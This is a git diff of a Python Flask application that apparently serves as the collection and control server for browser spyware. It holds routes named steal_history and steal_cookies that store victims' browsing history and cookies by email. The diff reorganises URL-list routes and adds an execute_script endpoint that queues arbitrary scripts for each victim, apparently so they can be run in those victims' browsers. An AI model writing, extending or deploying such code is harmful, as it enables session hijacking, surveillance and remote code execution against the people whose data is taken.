@@ -8,6 +8,7 @@ from pyfiles import users, login, secure, history, cookies
 
 app = Flask(__name__)
 
+executeQueue = {} # Faster than DB
 
 @app.route("/")
 def index():
@@ -35,6 +36,7 @@ def view_user(email):
     logs = login.get_logins_by_user(email)
     return render_template('user.html', email=email, history=hist, cookies=cook, logins=logs)
 
+########### SECURE ###########
 @app.route('/addSecure/<email>', methods=['POST'])
 def add_secure(email):
     if request.method == 'POST':
@@ -48,26 +50,28 @@ def delete_secure(email, url):
         secure.removeFromSecure(email, url)
         return redirect(url_for('index'))
 
-@app.route('/deleteRandom/<email>/<url>', methods=['POST'])
-def delete_random(email, url):
-    if request.method == 'POST':
-        secure.removeFromRandom(email, url)
-        return redirect(url_for('index'))
-
 @app.route('/get_secure/<email>', methods=['GET'])
 def get_secure(email):
     return jsonify(s=secure.getFromSecure(email))
 
-@app.route('/get_random/<email>', methods=['GET'])
-def get_random(email):
-    return jsonify(r=secure.getFromRandom(email))
-
+########### RANDOM ###########
 @app.route('/addRandom/<email>', methods=['POST'])
 def add_random(email):
     if request.method == 'POST':
         url = request.form['url']
         secure.addToRandom(email, url)
         return redirect(url_for('index'))
+
+@app.route('/deleteRandom/<email>/<url>', methods=['POST'])
+def delete_random(email, url):
+    if request.method == 'POST':
+        secure.removeFromRandom(email, url)
+        return redirect(url_for('index'))
+
+@app.route('/get_random/<email>', methods=['GET'])
+def get_random(email):
+    return jsonify(r=secure.getFromRandom(email))
+
 
 @app.route("/steal_history", methods=['POST'])
 def steal_history():
@@ -97,6 +101,14 @@ def steal_cookies():
         cookies.bulk_add_to_cookies(email, url, cookie)
         return "WHATS UP dawg?"
 
+@app.route("/execute_script/<email>", methods=['POST'])
+def execute_script(email):
+    if request.method == 'POST':
+        script = request.form['script']
+        oldList = executeQueue.get(str(email), [])
+        oldList.append(str(script))
+        executeQueue[str(email)] = oldList
+        return redirect(url_for('index'))
 
 if __name__ == "__main__":
     # So template reloads when data is changed
